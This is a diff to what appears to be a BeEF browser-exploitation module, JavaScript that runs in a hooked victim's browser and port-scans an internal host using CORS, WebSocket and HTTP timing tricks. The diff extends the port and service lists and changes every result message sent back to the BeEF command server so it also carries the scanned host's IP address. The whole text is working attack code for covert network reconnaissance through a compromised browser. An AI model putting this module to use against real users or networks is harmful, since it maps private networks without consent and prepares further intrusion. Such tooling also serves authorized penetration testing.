@@ -9,9 +9,9 @@ beef.execute(function() {
 
 	var blocked_ports = [ 1, 7, 9, 11, 13, 15, 17, 19, 20, 21, 22, 23, 25, 37, 42, 43, 53, 77, 79, 87, 95, 101, 102, 103, 104, 109, 110, 111, 113, 115, 117, 119, 123, 135, 139, 143, 179, 389, 465, 512, 513, 514, 515, 526, 530, 531, 532, 540, 556, 563, 587, 601, 636, 993, 995, 2049, 3659, 4045, 6000, 6665, 6666, 6667, 6668, 6669, 65535 ];
 	
-	var default_ports = [ 1,5,7,9,15,20,21,22,23,25,26,29,33,37,42,43,53,67,68,69,70,76,79,80,88,90,98,101,106,109,110,111,113,114,115,118,119,123,129,132,133,135,136,137,138,139,143,144,156,158,161,162,168,174,177,194,197,209,213,217,219,220,223,264,315,316,346,353,389,413,414,415,416,440,443,444,445,453,454,456,457,458,462,464,465,466,480,486,497,500,501,516,518,522,523,524,525,526,533,535,538,540,541,542,543,544,545,546,547,556,557,560,561,563,564,625,626,636,637,660,664,666,683,740,741,742,744,747,748,749,750,751,752,753,754,758,760,761,762,763,764,765,767,771,773,774,775,776,780,781,782,783,786,787,799,800,801,808,871,873,888,898,901,953,989,990,992,993,994,995,996,997,998,999,1000,1002,1008,1023,1024,1080,8080,8443,8050,3306,5432,1521,1433,3389,10088 ];
+	var default_ports = [ 1,5,7,9,15,20,21,22,23,25,26,29,33,37,42,43,53,67,68,69,70,76,79,80,88,90,98,101,106,109,110,111,113,114,115,118,119,123,129,132,133,135,136,137,138,139,143,144,156,158,161,162,168,174,177,194,197,209,213,217,219,220,223,264,315,316,346,353,389,413,414,415,416,440,443,444,445,453,454,456,457,458,462,464,465,466,480,486,497,500,501,516,518,522,523,524,525,526,533,535,538,540,541,542,543,544,545,546,547,556,557,560,561,563,564,625,626,631,636,637,660,664,666,683,740,741,742,744,747,748,749,750,751,752,753,754,758,760,761,762,763,764,765,767,771,773,774,775,776,780,781,782,783,786,787,799,800,801,808,871,873,888,898,901,953,989,990,992,993,994,995,996,997,998,999,1000,1002,1008,1023,1024,1080,8080,8443,8050,3306,5432,1521,1433,3389,10088 ];
 
-	var default_services = { '1':'tcpmux','5':'rje','7':'echo','9':'msn','15':'netstat','20':'ftp-data','21':'ftp','22':'ssh','23':'telnet','25':'smtp','26':'rsftp','29':'msgicp','33':'dsp','37':'time','42':'nameserver','43':'whois','53':'dns','67':'dhcps','68':'dhcpc','69':'tftp','70':'gopher','76':'deos','79':'finger','80':'http','88':'kerberos-sec','90':'dnsix','98':'linuxconf','101':'hostname','106':'pop3pw','109':'pop2','110':'pop3','111':'rpcbind','113':'auth','114':'audionews','115':'sftp','118':'sqlserv','119':'nntp','123':'ntp','129':'pwdgen','132':'cisco-sys','133':'statsrv','135':'msrpc','136':'profile','137':'netbios-ns','138':'netbios-dgm','139':'netbios-ssn','143':'imap','144':'news','156':'sqlserv','158':'pcmail-srv','161':'snmp','162':'snmptrap','168':'rsvd','174':'mailq','177':'xdmcp','194':'irc','197':'dls','209':'tam','213':'ipx','217':'dbase','219':'uarps','220':'imap3','223':'cdc','264':'bgmp','315':'dpsi','316':'decauth','346':'zserv','353':'ndsauth','389':'ldap','413':'smsp','414':'infoseek','415':'bnet','416':'silverplatter','440':'sgcp','443':'https','444':'snpp','445':'microsoft-ds','453':'creativeserver','454':'contentserver','456':'macon','457':'scohelp','458':'appleqtc','462':'datasurfsrvsec','464':'kpasswd5','465':'smtps','466':'digital-vrc','480':'loadsrv','486':'sstats','497':'retrospect','500':'isakmp','501':'stmf','516':'videotex','518':'ntalk','522':'ulp','523':'ibm-db2','524':'ncp','525':'timed','526':'tempo','533':'netwall','535':'iiop','538':'gdomap','540':'uucp','541':'uucp-rlogin','542':'commerce','543':'klogin','544':'kshell','545':'ekshell','546':'dhcpconf','547':'dhcpserv','556':'remotefs','557':'openvms-sysipc','560':'rmonitor','561':'monitor','563':'snews','564':'9pfs','625':'apple-xsrvr-admin','626':'apple-imap-admin','636':'ldapssl','637':'lanserver','660':'mac-srvr-admin','664':'secure-aux-bus','666':'doom','683':'corba-iiop','740':'netcp','741':'netgw','742':'netrcs','744':'flexlm','747':'fujitsu-dev','748':'ris-cm','749':'kerberos-adm','750':'kerberos','751':'kerberos_master','752':'qrh','753':'rrh','754':'krb_prop','758':'nlogin','760':'krbupdate','761':'kpasswd','762':'quotad','763':'cycleserv','764':'omserv','765':'webster','767':'phonebook','771':'rtip','773':'submit','774':'rpasswd','775':'entomb','776':'wpages','780':'wpgs','781':'hp-collector','782':'hp-managed-node','783':'spamassassin','786':'concert','787':'qsc','799':'controlit','800':'mdbs_daemon','801':'device','808':'ccproxy-http','871':'supfilesrv','873':'rsync','888':'accessbuilder','898':'sun-manageconsole','901':'samba-swat','953':'rndc','989':'ftps-data','990':'ftps','992':'telnets','993':'imaps','994':'ircs','995':'pop3s','996':'xtreelic','997':'maitrd','998':'busboy','999':'garcon','1000':'cadlock','1002':'windows-icfw','1008':'ufsd','1023':'netvenuechat','1024':'kdm','1080':'socks','8080':'tomcat','8443':'tomcat','8050':'coldfusion','3306':'mysql','5432':'postgres','1521 ':'oracle','1433':'mssql','3389':'msrdp','10088':'zendserver' };
+	var default_services = { '1':'tcpmux','5':'rje','7':'echo','9':'msn','15':'netstat','20':'ftp-data','21':'ftp','22':'ssh','23':'telnet','25':'smtp','26':'rsftp','29':'msgicp','33':'dsp','37':'time','42':'nameserver','43':'whois','53':'dns','67':'dhcps','68':'dhcpc','69':'tftp','70':'gopher','76':'deos','79':'finger','80':'http','88':'kerberos-sec','90':'dnsix','98':'linuxconf','101':'hostname','106':'pop3pw','109':'pop2','110':'pop3','111':'rpcbind','113':'auth','114':'audionews','115':'sftp','118':'sqlserv','119':'nntp','123':'ntp','129':'pwdgen','132':'cisco-sys','133':'statsrv','135':'msrpc','136':'profile','137':'netbios-ns','138':'netbios-dgm','139':'netbios-ssn','143':'imap','144':'news','156':'sqlserv','158':'pcmail-srv','161':'snmp','162':'snmptrap','168':'rsvd','174':'mailq','177':'xdmcp','194':'irc','197':'dls','209':'tam','213':'ipx','217':'dbase','219':'uarps','220':'imap3','223':'cdc','264':'bgmp','315':'dpsi','316':'decauth','346':'zserv','353':'ndsauth','389':'ldap','413':'smsp','414':'infoseek','415':'bnet','416':'silverplatter','440':'sgcp','443':'https','444':'snpp','445':'microsoft-ds','453':'creativeserver','454':'contentserver','456':'macon','457':'scohelp','458':'appleqtc','462':'datasurfsrvsec','464':'kpasswd5','465':'smtps','466':'digital-vrc','480':'loadsrv','486':'sstats','497':'retrospect','500':'isakmp','501':'stmf','516':'videotex','518':'ntalk','522':'ulp','523':'ibm-db2','524':'ncp','525':'timed','526':'tempo','533':'netwall','535':'iiop','538':'gdomap','540':'uucp','541':'uucp-rlogin','542':'commerce','543':'klogin','544':'kshell','545':'ekshell','546':'dhcpconf','547':'dhcpserv','556':'remotefs','557':'openvms-sysipc','560':'rmonitor','561':'monitor','563':'snews','564':'9pfs','625':'apple-xsrvr-admin','626':'apple-imap-admin','631':'ipp','636':'ldapssl','637':'lanserver','660':'mac-srvr-admin','664':'secure-aux-bus','666':'doom','683':'corba-iiop','740':'netcp','741':'netgw','742':'netrcs','744':'flexlm','747':'fujitsu-dev','748':'ris-cm','749':'kerberos-adm','750':'kerberos','751':'kerberos_master','752':'qrh','753':'rrh','754':'krb_prop','758':'nlogin','760':'krbupdate','761':'kpasswd','762':'quotad','763':'cycleserv','764':'omserv','765':'webster','767':'phonebook','771':'rtip','773':'submit','774':'rpasswd','775':'entomb','776':'wpages','780':'wpgs','781':'hp-collector','782':'hp-managed-node','783':'spamassassin','786':'concert','787':'qsc','799':'controlit','800':'mdbs_daemon','801':'device','808':'ccproxy-http','871':'supfilesrv','873':'rsync','888':'accessbuilder','898':'sun-manageconsole','901':'samba-swat','953':'rndc','989':'ftps-data','990':'ftps','992':'telnets','993':'imaps','994':'ircs','995':'pop3s','996':'xtreelic','997':'maitrd','998':'busboy','999':'garcon','1000':'cadlock','1002':'windows-icfw','1008':'ufsd','1023':'netvenuechat','1024':'kdm','1080':'socks','1434':'ms-sql-m','4489':'radmin','6000':'x11','6446':'mysql-proxy','8080':'tomcat','8443':'tomcat','8050':'coldfusion','3306':'mysql','5432':'postgres','1521 ':'oracle','1433':'mssql','3389':'msrdp','10000':'webmin','10088':'zendserver','11371':'hkp' };
 	
 	var host = '<%= @ipHost %>';
 	// TODO: Adjust times for each browser
@@ -106,7 +106,7 @@ beef.execute(function() {
 		{
 			process_port_cors = true;
 			port_status_cors = 4; // blocked
-			if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is BLOCKED');}
+			if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=CORS: Port ' + port_ + ' is BLOCKED');}
 			return;
 		}
 
@@ -145,7 +145,7 @@ beef.execute(function() {
 				if (interval < closetimeout)
 				{
 					port_status_cors =  1; // closed
-					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is CLOSED');}
+					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=CORS: Port ' + port_ + ' is CLOSED');}
 				} else 
 				{
 					port_status_cors = 2; // open
@@ -154,7 +154,7 @@ beef.execute(function() {
 					{
 						known_service = "(" + default_services[port_] + ")";
 					}
-					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is OPEN ' + known_service);
+					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=CORS: Port ' + port_ + ' is OPEN ' + known_service);
 				}
 			}
 
@@ -163,7 +163,7 @@ beef.execute(function() {
 				clearInterval(intID_cors);
 				process_port_cors = true;
 				port_status_cors = 3; // timeout
-				if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=CORS: Port ' + port_ + ' is TIMEOUT');}
+				if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=CORS: Port ' + port_ + ' is TIMEOUT');}
 			}	
 			return;	
 		}
@@ -176,7 +176,7 @@ beef.execute(function() {
 		{
 			process_port_ws = true;
 			port_status_ws = 4; // blocked
-			if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is BLOCKED');}
+			if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=WebSocket: Port ' + port_ + ' is BLOCKED');}
 			return;
 		}
 
@@ -222,7 +222,7 @@ beef.execute(function() {
 				if (interval < closetimeout)
 				{
 					port_status_ws =  1; // closed
-					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is CLOSED');}
+					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=WebSocket: Port ' + port_ + ' is CLOSED');}
 				} else 
 				{
 					port_status_ws = 2; // open
@@ -231,7 +231,7 @@ beef.execute(function() {
 					{
 						known_service = "(" + default_services[port_] + ")";
 					}
-					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is OPEN ' + known_service);
+					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=WebSocket: Port ' + port_ + ' is OPEN ' + known_service);
 				}
 				ws_scan.close();
 			}
@@ -241,7 +241,7 @@ beef.execute(function() {
 				clearInterval(intID_ws);
 				process_port_ws = true;
 				port_status_ws = 3; // timeout
-				if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=WebSocket: Port ' + port_ + ' is TIMEOUT');}
+				if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=WebSocket: Port ' + port_ + ' is TIMEOUT');}
 				ws_scan.close();		
 			}	
 			return;	
@@ -264,7 +264,7 @@ beef.execute(function() {
 				if (process_port_http == false)
 				{
 					port_status_http = 1; // closed
-					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=HTTP: Port ' + port_ + ' is CLOSED');}
+					if (debug_value){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=HTTP: Port ' + port_ + ' is CLOSED');}
 					clearInterval(intID_http);
 				}
 				process_port_http = true;
@@ -297,7 +297,7 @@ beef.execute(function() {
 				{
 					known_service = "(" + default_services[port_] + ")";
 				}
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=HTTP: Port ' + port_ + ' is OPEN ' + known_service);
+				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ip='+host+'&port=HTTP: Port ' + port_ + ' is OPEN ' + known_service);
 			}
 		}
 		, 1);
@@ -311,7 +311,7 @@ beef.execute(function() {
 		return;
 	} else 
 	{
-		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=Scanning: ' + ports_list);
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=Scanning '+host+' [ports: ' + ports_list + ']');
 	}
 	
 	count = 0;
